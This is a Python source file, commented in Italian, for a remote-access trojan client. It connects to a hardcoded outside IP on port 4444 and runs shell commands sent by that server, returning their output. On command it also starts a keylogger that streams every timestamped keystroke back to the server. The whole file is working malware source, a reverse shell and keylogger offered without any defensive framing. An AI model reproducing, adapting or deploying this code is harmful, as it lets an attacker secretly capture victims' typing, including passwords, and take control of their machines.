from sys import stderr
import threading
import datetime
import subprocess
import time
import os
import sock

from pynput.keyboard import Key, Listener 
from threading import *
import socket
host="5.88.67.225" #indirizzo ip del server
port=4444#
buffersize=65536
def client():
    global conn
    try:
        conn=socket.socket()
        conn.connect((host, port)) #si connette al servers
    except:
        raise
        time.sleep(2)
        main()
def keylogger():
    with Listener(on_press=press, on_release=release) as listener:
        listener.join()
def press(key):
    now=datetime.datetime.now() #salva in una variabile la data e l'ora correnti
    ckey=""
    strnow=str(now)
    if str(key)=="Key.space":
        ckey="SPACE" 
    if str(key)=="Key.backspace":
        ckey="BACK"    
    else:
         ckey=f"{str(key)}"   
    if keystop==False:
        message=str(ckey)+" pressed "+"["+strnow+"]"
        conn.send(message.encode())  #invia i tasti premuti trasformandoli prima in bytes   
    else:
        return False
def release(key):
    pass         #funzione che il modulo pynput obbliga a definire (inutile)
def recv():
     global keystop
     keystop=False #definisce il valore dafault della variabile booleana 
     while True:
         data=conn.recv(buffersize)
         if data.decode()=="keylogger":
             x=threading.Thread(target=keylogger) #sottoprocesso 1: avvia il keylogger
             y=threading.Thread(target=recv) #sottoprocessso 2: avvia la ricezione dati 
             x.start() #inizio sottoprocesso1
             y.start() #inizio sottoprocesso2
         elif data.decode()=="keystop":
             keystop=not keystop #la variabile booleana diventa TRue per stoppare keylogger
         elif "cd" in data.decode():
             tmp=data.decode().split()
             directory=tmp[1]
             try:
                    os.chdir(directory)
                    conn.send("command executed, no output".encode())
             except FileNotFoundError:
                conn.send("error raised, path not found".encode())
         else:
             command=subprocess.run(data.decode(), shell=True, capture_output=True, stdin=subprocess.DEVNULL) #esegue il comando
             output=command.stdout+command.stderr #salva output comando nella variabile 
             if output:
                conn.sendall(output) #invia output a server
             else:
                conn.send("command executed, no output".encode()) 
def main():
     client()
     recv()                 
if __name__=="__main__":
    main() #se il programma non viene importato come modulo, avvia server (facoltativo)            


